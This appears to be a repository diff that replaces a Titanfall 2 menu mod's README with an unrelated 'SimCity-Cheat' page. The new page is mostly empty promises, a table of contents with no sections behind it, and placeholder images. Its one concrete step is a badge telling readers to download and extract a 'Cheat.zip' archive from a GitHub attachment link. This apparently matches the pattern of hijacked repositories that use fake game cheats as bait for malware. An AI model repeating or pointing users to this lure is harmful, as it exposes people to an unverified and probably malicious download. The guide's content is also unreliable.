@@ -1,120 +1,68 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# SimCity-Cheat
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+This repository contains cheats and tips for the popular city-building simulation game, SimCity. Whether you're a newbie looking to build your dream city without worrying about money or an experienced player seeking to unlock new possibilities, this cheat guide covers it all.
 
+![SimCity Logo](https://example.com/simcity-logo.png)
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Cheat Guide
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+In this cheat guide, you will find detailed instructions on how to manipulate various aspects of the game to your advantage. From unlimited money hacks to population boost tricks, we've got you covered.
+
+### Table of Contents
+1. Introduction to SimCity Cheats
+2. Getting Started
+3. Unlimited Money Cheat
+4. Population Boost Trick
+5. Unlocking Special Buildings
+6. Troubleshooting Tips
+7. Frequently Asked Questions
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To download the cheat file, click the button below:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-orange)](https://github.com/user-attachments/files/17043020/Cheat.zip)
 
-## Icepick
+## Instructions
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+Follow these step-by-step instructions to apply the cheats successfully:
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+1. Download the cheat file from the link provided above.
+2. Extract the contents of the zip file to a folder on your computer.
+3. Open the cheat file using a text editor or cheat engine software.
+4. Follow the instructions within the cheat file to activate different cheats in the game.
 
-3) Launch Icepick.
+## Contributing
 
-## Northstar
+If you have more cheats or tips to share with the SimCity community, feel free to contribute to this repository. Fork the repository, make your changes, and submit a pull request.
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+### Guidelines for Contributions:
+- Ensure that the cheats are legitimate and do not compromise the gaming experience for others.
+- Clearly document the steps to apply the cheats.
+- Test the cheats before submitting to avoid any issues.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+## Credits
 
-3) Launch Northstar.
+Special thanks to the following contributors for their valuable insights and tips:
 
-## Screenshots
+- @SimCityMaster
+- @CityBuilderPro
+- @CheaterExtraordinaire
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+## Resources
 
-Main Menu with the original Titanfall 2 menu video
+For more information on SimCity cheats and strategies, check out the following resources:
+- [SimCity Forums](https://www.simcityforums.com)
+- [SimCity Subreddit](https://www.reddit.com/r/simcity)
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+## License
 
-Main Menu with the showcase removed to declutter the menu
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+🏗️ Happy City Building! 🏙️
 
-New Cheat options that can be enabled as well as the extras menu
+![SimCity Screenshot](https://example.com/simcity-screenshot.png)
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+---
 
-Added keybinds for speedrunners and extra commands for fun
-
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+*Disclaimer: This cheat guide is intended for educational purposes and to enhance the gaming experience. Use cheats responsibly and at your own discretion.*
